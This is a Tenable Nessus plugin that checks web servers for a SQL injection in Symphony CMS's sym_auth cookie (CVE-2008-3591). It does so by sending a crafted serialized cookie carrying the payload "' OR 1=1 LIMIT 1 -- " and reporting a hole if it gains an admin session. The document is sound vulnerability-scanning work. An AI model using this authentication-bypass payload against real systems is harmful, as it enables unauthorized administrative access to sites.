#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(33811);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-3591");
  script_bugtraq_id(30477);
  script_xref(name:"milw0rm", value:"6177");
  script_xref(name:"OSVDB", value:"47323");
  script_xref(name:"Secunia", value:"31293");

  script_name(english:"Symphony sym_auth Cookie SQL Injection");
  script_summary(english:"Tries to bypass admin login");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Symphony, a web publishing system written
in PHP. 

The version of Symphony installed on the remote host fails to sanitize
user-supplied input to the 'sym_auth' cookie before using it in the
'login' function in 'lib/class.admin.php' in a database query. 
Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
attacker may be able to exploit this issue to manipulate database
queries to bypass authentication and gain administrative access,
disclose sensitive information, attack the underlying database, etc. 

Note that the application also reportedly allows an attacker with
admin access -- perhaps achieved via this issue -- to upload arbitrary
files and then execute them, although Nessus has not actually checked
for this." );
 script_set_attribute(attribute:"see_also", value:"http://overture21.com/forum/comments.php?DiscussionID=1823" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch referenced in the vendor advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Define some variables.
user = SCRIPT_NAME;
pass = "nessus' OR 1=1 LIMIT 1 -- ";
id = 1;
exploit = string(
  'a:3:{',
    's:8:"username";s:', strlen(user), ':"', user, '";',
    's:8:"password";s:', strlen(pass), ':"', pass, '";',
    's:2:"id";i:1;',
  '}'
);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/symphony", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/symphony/");
  val = get_http_cookie(name: "sym_auth_safe");
  if (! isnull(val)) clear_cookiejar();
  set_http_cookie(name: "sym_auth", value: urlencode(str:exploit));
  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # There's a problem if we appear to be logged in now.
  val = get_http_cookie(name: "sym_auth_safe");
  if (
     #    egrep(pattern:'^Set-Cookie: .*sym_auth_safe=[A-Za-z0-9%]', string:r[1]) &&
     ! isnull(val) &&
     egrep(pattern:'^Location: .*/symphony/\\?page=', string:r[1])
  )
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to bypass authentication and gain administrative\n",
        "access using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n",
        "along with the following session cookie :\n",
        "\n",
        "  sym_auth=", urlencode(str:exploit), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
